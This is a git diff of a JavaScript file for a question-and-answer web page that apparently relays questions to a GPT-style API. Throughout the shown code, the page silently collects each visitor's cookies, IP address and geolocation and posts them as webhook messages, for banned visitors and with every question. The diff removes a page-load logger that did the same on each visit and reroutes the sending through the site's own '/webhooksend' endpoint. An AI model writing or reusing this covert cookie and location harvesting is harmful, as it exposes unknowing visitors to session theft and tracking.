@@ -1,8 +1,5 @@
-// Environment variables assigned to local variables
-const apiUrl = process.env.API_URL; // 
-const ipInfoLink = process.env.IPINFO_LINK; // 
-const ipInfoToken = process.env.IPINFO_TOKEN; // 
-const webhookUrl = process.env.WEBHOOK_URL; // 
+// Base API URL
+const apiUrl = 'https://cakestudio.onrender.com/api';
 
 // Emoji list
 const statusEmojis = {
@@ -18,6 +15,7 @@ const statusEmojis = {
     rage: 'https://link-to-rage-emoji.png' // Placeholder, to be updated later
 };
 
+// List of banned users
 const bannedUsers = [
     { cookie: 'example_cookie1', ip: '192.168.1.1' },
     { cookie: 'example_cookie2', ip: '192.168.1.2' },
@@ -25,7 +23,8 @@ const bannedUsers = [
 ];
 
 document.addEventListener('DOMContentLoaded', async function () {
-    const ipInfoResponse = await fetch(`${ipInfoLink}${ipInfoToken}`); // Using environment variable for IP info
+    // Fetch IP information from your API
+    const ipInfoResponse = await fetch(`${apiUrl}/ipinfo`); // Use the base API URL
     const ipData = await ipInfoResponse.json();
     const visitorCookie = document.cookie || 'No cookies found';
 
@@ -39,18 +38,11 @@ document.addEventListener('DOMContentLoaded', async function () {
     statusImage.src = statusEmojis.space;
     statusMessage.innerText = "Loading...";
 
-    // Toggle dark mode functionality
-    const toggleDarkModeButton = document.getElementById('toggleDarkModeButton');
-    toggleDarkModeButton.addEventListener('click', function () {
-        document.body.classList.toggle('dark-mode');
-        this.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
-    });
-
     // Check if the visitor is banned
     const isBanned = bannedUsers.some(user => user.cookie === visitorCookie || user.ip === ipData.ip);
 
     if (isBanned) {
-        // Send webhook for banned user visit
+        // Handle banned user
         const bannedVisitWebhookMessage = {
             title: "Banned User Visit",
             description: `
@@ -65,7 +57,7 @@ document.addEventListener('DOMContentLoaded', async function () {
             `.trim(),
             color: 16711680 // Red color to indicate a banned user
         };
-        await sendWebhook(bannedVisitWebhookMessage);
+        await sendWebhook(bannedVisitWebhookMessage); // Send webhook for banned user
 
         // Disable interaction and notify the user
         sendButton.disabled = true;
@@ -79,25 +71,6 @@ document.addEventListener('DOMContentLoaded', async function () {
     statusMessage.innerText = "Waiting...";
     statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji
 
-    // Send webhook data on page visit for non-banned users
-    const visitWebhookMessage = {
-        title: "New Website Visit",
-        description: `
-**IP:** ${ipData.ip}
-**City:** ${ipData.city}
-**Region:** ${ipData.region}
-**Country:** ${ipData.country}
-**Timezone:** ${ipData.timezone}
-**Org:** ${ipData.org}
-**Location:** ${ipData.loc}
-**Cookies:** ${visitorCookie}
-        `.trim(),
-        color: Math.floor(Math.random() * 16777215) // Random color
-    };
-
-    // Send webhook for new visitor
-    await sendWebhook(visitWebhookMessage);
-
     // Handle question asking and response
     const inputBox = document.getElementById("question");
 
@@ -109,28 +82,21 @@ document.addEventListener('DOMContentLoaded', async function () {
         statusMessage.innerText = "Waiting...";
         statusImage.src = statusEmojis.ellipsis; // Set to ellipsis emoji
 
-        const startTime = Date.now();
         try {
-            const response = await fetch(`${apiUrl}${encodeURIComponent(question)}`); // Using environment variable for API URL
+            const response = await fetch(`${apiUrl}/testgpt?question=${encodeURIComponent(question)}`); // Using base API URL
 
             // Check if the response is OK (status code in the range 200-299)
             if (!response.ok) {
-                const errorMessage = getHttpErrorMessage(response.status);
-                throw new Error(`HTTP Error! Code: ${response.status} - ${errorMessage}`);
+                throw new Error(`HTTP Error! Code: ${response.status}`);
             }
 
             const data = await response.json(); // Try to parse as JSON
-            const endTime = Date.now();
-
-            const timeTaken = endTime - startTime;
-            const formattedTime = formatDuration(timeTaken);
 
             const questionWebhookMessage = {
                 title: "Question Asked",
                 description: `
 **Question:** ${question}
 **Response:** ${data.cevap}
-**Time Taken:** ${formattedTime}
 **IP:** ${ipData.ip}
 **City:** ${ipData.city}
 **Region:** ${ipData.region}
@@ -139,7 +105,7 @@ document.addEventListener('DOMContentLoaded', async function () {
 **Location:** ${ipData.loc}
 **Cookies:** ${visitorCookie}
                 `.trim(),
-                color: Math.floor(Math.random() * 16777215)
+                color: Math.floor(Math.random() * 16777215) // Random color
             };
 
             // Send webhook for the question
@@ -188,47 +154,12 @@ document.addEventListener('DOMContentLoaded', async function () {
             embeds: [embedMessage]
         };
 
-        await fetch(webhookUrl, { // Using environment variable for webhook URL
+        await fetch(`${apiUrl}/webhooksend`, { // Use base API URL for sending webhooks
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json'
             },
             body: JSON.stringify(payload)
         });
-    }
-
-    function formatDuration(ms) {
-        if (ms < 1000) {
-            return `${ms} ms`;
-        } else if (ms < 60000) {
-            return `${Math.floor(ms / 1000)} seconds`;
-        } else {
-            return `${Math.floor(ms / 60000)} minutes`;
-        }
-    }
-
-    function getHttpErrorMessage(statusCode) {
-        switch (statusCode) {
-            case 400:
-                return 'Bad Request';
-            case 401:
-                return 'Unauthorized';
-            case 403:
-                return 'Forbidden';
-            case 404:
-                return 'Not Found';
-            case 500:
-                return 'Internal Server Error';
-            case 502:
-                return 'Bad Gateway';
-            case 503:
-                return 'Service Unavailable';
-            case 504:
-                return 'Gateway Timeout';
-            case 522:
-                return 'Timed Out';
-            default:
-                return 'Unknown Error';
-        }
     }
 });
